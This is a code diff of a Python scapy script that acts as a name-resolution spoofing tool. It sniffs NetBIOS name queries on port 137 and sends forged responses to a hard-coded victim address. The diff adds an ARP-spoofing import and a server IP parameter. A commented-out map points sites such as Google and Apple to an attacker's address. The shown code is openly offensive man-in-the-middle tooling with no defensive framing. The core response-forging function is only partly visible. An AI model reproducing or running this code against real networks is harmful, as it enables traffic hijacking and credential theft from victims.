@@ -2,18 +2,20 @@ from pip._vendor.distlib.compat import raw_input
 from scapy.all import *
 from scapy.layers.inet import IP, UDP
 from scapy.layers.netbios import NBNSQueryRequest, NBNSQueryResponse
+import arpSpoof
 
 
 class Dns():
 
-    def __init__(self,networkInterface, victimIP, spoofedWebsites):
+    def __init__(self,networkInterface, victimIP, serverIP, spoofedWebsites):
         self.networkInterface = networkInterface
         self.victimIP = victimIP
         self.spoofedWebsites = spoofedWebsites
+        self.serverIP = serverIP
 
 
     def startSniffing(self):
-        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=1)
+        sniff(prn=self.sendFakeResponse, iface=self.networkInterface, filter="port 137", timeout=20)
 
 
     def sendFakeResponse(self, pkt):
@@ -46,8 +48,7 @@ class Dns():
         while(True):
             self.startSniffing()
 
-
-
+  
 networkInterface = "enp0s3"
 victimIP = "192.168.56.101"
 #spoofedWebsites= {"WWW.GOOGLE.COM " : "192.168.56.102", "WWW.APPLE.COM  " : "192.168.56.102", "WWW.BLABLA.COM " : "192.168.56.102"} #when user will input it always add www. infront and make evrything in upper case
